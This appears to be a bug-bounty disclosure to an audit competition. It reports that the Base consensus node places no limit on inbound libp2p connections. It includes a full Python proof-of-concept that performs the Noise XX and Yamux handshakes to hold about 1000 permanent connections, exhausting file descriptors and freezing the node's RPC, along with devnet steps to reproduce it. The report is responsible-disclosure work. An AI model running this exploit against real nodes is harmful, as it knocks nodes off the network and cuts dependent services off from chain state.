# 75371 bc high unlimited p2p connections lead to node isolation and rpc crash

**Submitted on Apr 28th 2026 at 18:43:46 UTC by @DeltaXV for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #75371
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * RPC API crash affecting programs with greater than or equal to 25% of the market capitalization on top of the respective layer
  * Unintended chain split (network partition)
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

`base-consensus` accepts an unlimited number of inbound libp2p connections because `connection_limits::Behaviour` is never added to the Swarm and the CLI parameters `peers_hi` / `peers_lo` are emitted as metrics only — never wired to the swarm. An attacker can establish thousands of permanent authenticated connections from a single IP, exhausting the process file descriptor limit (`EMFILE`) on production systems, isolating the node from the gossip network, and crashing its RPC.

## Vulnerability Details

The libp2p `Behaviour` struct in [`base/crates/consensus/gossip/src/behaviour.rs`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/consensus/gossip/src/behaviour.rs) has four members:

```rust
pub struct Behaviour {
    pub ping: libp2p::ping::Behaviour,
    pub gossipsub: libp2p::gossipsub::Behaviour,
    pub identify: libp2p::identify::Behaviour,
    pub sync_req_resp: libp2p_stream::Behaviour,
}
```

`libp2p::connection_limits::Behaviour` is absent. Without it, `libp2p` 0.56 enforces zero connection limits — the Swarm accepts every inbound TCP connection until OS resources are exhausted.

The CLI flags `--p2p.peers.hi` (default 30) and `--p2p.peers.lo` (default 20) are parsed by [`base/crates/client/cli/src/p2p.rs`](https://github.com/base/base/blob/v0.8.0-rc.28/crates/client/cli/src/p2p.rs) but only written to Prometheus metrics in [`base/bin/consensus/src/metrics.rs`](https://github.com/base/base/blob/v0.8.0-rc.28/bin/consensus/src/metrics.rs). They never appear in `NetworkConfig`, `NetworkBuilder`, or `GossipDriverBuilder`. The configured limit of 30 peers has zero effect.

Additionally, the production binary never raises the file descriptor soft limit:

```bash
grep -rn "setrlimit\|rlimit\|nofile" base/bin/consensus/src/
# No results — only found in test_utils (never executed in production)
```

On a standard Linux system, `ulimit -n` defaults to **1024**. With \~27 FDs used at baseline, \~997 attacker connections exhaust the pool.

Each attacker connection completes the full Noise XX handshake + Yamux muxer negotiation, making it a permanent established connection. The `idle_connection_timeout=60s` is bypassed because Yamux keeps open substreams that prevent the idle detection from firing (confirmed [libp2p issue #5190](https://github.com/libp2p/rust-libp2p/issues/5190), still open in libp2p 0.56).

## Impact Details

Production nodes running with the default OS file descriptor limit (`ulimit -n 1024`) have their FD pool exhausted by \~997 attacker connections, causing the gossip mesh to collapse and the RPC to freeze — any dApp or service relying on that node loses access to current chain state. Even on nodes with raised FD limits, the attack causes +30% memory and +318% CPU increase from a single IP with zero ongoing cost.

## References

Add any relevant links to documentation or code

## Link to Proof of Concept

<https://gist.github.com/DeltaXV/770c383ac94b80812142e69e444fa2b9>

## Proof of Concept

{% stepper %}
{% step %}

## create the `attack.py` file and paste the following script:

```py
#!/usr/bin/env python3
"""
PoC: P2P Connection Limit Exhaustion — Base Consensus Node

Completes full libp2p Noise XX + Yamux negotiation producing permanent
connections that bypass idle_connection_timeout and are never closed.

command:
    python3 attack.py [HOST] [PORT] [NUM_CONNECTIONS]
"""

import socket
import struct
import threading
import time
import sys
import os

from noise.connection import NoiseConnection, Keypair
from cryptography.hazmat.primitives.asymmetric.ec import (
    generate_private_key, SECP256K1, ECDSA,
)
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend

TARGET_HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
TARGET_PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 8003
NUM_CONNS   = int(sys.argv[3]) if len(sys.argv) > 3 else 1000
DELAY       = 0.05

open_sockets = []
lock = threading.Lock()
stop = threading.Event()
established = 0
failed = 0

def nf(p):
    return struct.pack(">H", len(p)) + p

def rnf(s):
    h = b""
    while len(h) < 2:
        c = s.recv(2 - len(h))
        if not c: raise ConnectionError()
        h += c
    l = struct.unpack(">H", h)[0]
    d = b""
    while len(d) < l:
        c = s.recv(l - len(d))
        if not c: raise ConnectionError()
        d += c
    return d

def ems(proto):
    m = proto.encode() + b"\n"
    l = len(m)
    v = b""
    while l > 0x7F:
        v += bytes([0x80 | (l & 0x7F)])
        l >>= 7
    v += bytes([l])
    return v + m

MS_HEADER = bytes.fromhex("132f6d756c746973747265616d2f312e302e300a")
NOISE_SEL = bytes.fromhex("072f6e6f6973650a")


def drain(sock):
    try:
        while not stop.is_set():
            data = sock.recv(4096)
            if not data:
                break
    except Exception:
        pass


def connect_one(idx):
    global established, failed
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect((TARGET_HOST, TARGET_PORT))

        # Multistream-select
        s.sendall(MS_HEADER)
        s.recv(4096)
        s.sendall(NOISE_SEL)
        s.recv(4096)

        # Noise XX handshake
        n = NoiseConnection.from_name(b"Noise_XX_25519_ChaChaPoly_SHA256")
        n.set_as_initiator()
        n.set_keypair_from_private_bytes(Keypair.STATIC, os.urandom(32))
        n.start_handshake()

        s.sendall(nf(n.write_message()))
        n.read_message(rnf(s))

        pk = generate_private_key(SECP256K1(), default_backend())
        pub = pk.public_key().public_bytes(
            serialization.Encoding.X962,
            serialization.PublicFormat.CompressedPoint,
        )
        sp = n.noise_protocol.keypairs["s"].public.public_bytes_raw()
        sig = pk.sign(b"noise-libp2p-static-key:" + sp, ECDSA(hashes.SHA256()))
        ik = b"\x08\x02\x12\x21" + pub
        pay = bytes([0x0A, len(ik)]) + ik + bytes([0x12, len(sig)]) + sig
        s.sendall(nf(n.write_message(pay)))

        # Yamux muxer negotiation (through encrypted channel)
        s.sendall(nf(n.encrypt(ems("/multistream/1.0.0") + ems("/yamux/1.0.0"))))
        n.decrypt(rnf(s))  # multistream ack
        n.decrypt(rnf(s))  # yamux ack

        s.settimeout(None)
        with lock:
            open_sockets.append(s)
        established += 1
        threading.Thread(target=drain, args=(s,), daemon=True).start()
        return True

    except Exception as e:
        failed += 1
        try: s.close()
        except: pass
        if idx < 3 or idx % 100 == 0:
            print(f"  [!] #{idx}: {e}")
        return False


def status():
    while not stop.is_set():
        with lock:
            n = len(open_sockets)
        print(
            f"\r  [*] Established: {established}  |  Alive: {n}  "
            f"|  Failed: {failed}  |  Target: {NUM_CONNS}    ",
            end="", flush=True,
        )
        time.sleep(1)


print(f"[+] Target  : {TARGET_HOST}:{TARGET_PORT}")
print(f"[+] Goal    : {NUM_CONNS} permanent libp2p connections")
print(f"[+] Method  : Noise XX + Yamux (bypasses idle_connection_timeout)")
print()

threading.Thread(target=status, daemon=True).start()

for i in range(NUM_CONNS):
    connect_one(i)
    time.sleep(DELAY)

print(f"\n\n[+] Result: {established} permanent connections established.")
print(f"[+] These connections survive indefinitely (Yamux keepalive).")
print(f"[*] Press Ctrl-C to release.\n")

try:
    stop.wait()
except KeyboardInterrupt:
    pass
finally:
    stop.set()
    print("\n[*] Closing...")
    with lock:
        for s in open_sockets:
            try: s.close()
            except: pass
    print("[*] Done.")
```

{% endstep %}

{% step %}

## Start the devnet:

```bash
cd base
just -f etc/docker/Justfile up-single
```

{% endstep %}

{% step %}

## Wait for all containers to be healthy:

```bash
docker compose --env-file etc/docker/devnet-env \
  -f etc/docker/docker-compose.yml ps
```

{% endstep %}

{% step %}

## Take baseline measurement:

```bash
docker exec base-client-cl sh -c 'ls /proc/1/fd | wc -l'
# Expected: ~27
curl -sf -X POST -H "Content-Type: application/json" \
  --data '{"jsonrpc":"2.0","method":"opp2p_peerCount","params":[],"id":1}' \
  http://localhost:8549
# Expected: {"connectedGossip": 1}
```

{% endstep %}

{% step %}

## Run the attack (in a separate terminal):

```bash
python3 poc/fd_exhaustion/attack.py 127.0.0.1 8003 1000
```

{% endstep %}

{% step %}

## Observe the impact:

```bash
docker exec base-client-cl sh -c 'ls /proc/1/fd | wc -l'
# Result: ~1027 (was 27)
curl -sf -X POST -H "Content-Type: application/json" \
  --data '{"jsonrpc":"2.0","method":"opp2p_peerCount","params":[],"id":1}' \
  http://localhost:8549
# Result: {"connectedGossip": 1001} (was 1)
```

All connections from a single IP. Zero failures. Zero authentication beyond a fresh random keypair. Connections are permanent — they survive indefinitely with zero attacker maintenance after the initial 50-second setup.
{% endstep %}
{% endstepper %}

### Remediation

Rate limits in p2p node mechanism is crucial to avoid this type of attack where further exploitation can lead to more damage.
